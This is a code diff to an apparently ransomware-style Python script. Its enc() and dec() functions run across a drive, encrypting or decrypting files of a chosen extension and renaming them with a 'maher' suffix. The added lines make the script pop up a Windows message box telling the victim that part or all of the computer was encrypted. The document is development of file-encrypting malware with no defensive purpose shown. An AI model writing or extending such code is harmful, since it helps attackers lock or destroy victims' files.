@@ -37,6 +37,11 @@ def enc(target_file_extention, encrypted_file_extention="maher", key=1, drive="D
                     print(i + "------------> " + "Encrypted")
             except:
                 pass
+
+        if platform.uname()[0] == "Windows":
+            import win32api
+            win32api.MessageBox(0, 'Part/All of your computer was encrypted!', 'title')
+
     except:
         pass
 
@@ -67,6 +72,11 @@ def dec(encrypted_file_extention="maher", key=1, drive="D"):
                         print(i + "------------> " + "Decrypted")
                 except:
                     pass
+        if platform.uname()[0] == "Windows":
+            import win32api
+            win32api.MessageBox(0, 'Part/All of your computer was decrypted!', 'title')
+
+
     except:
         pass
 
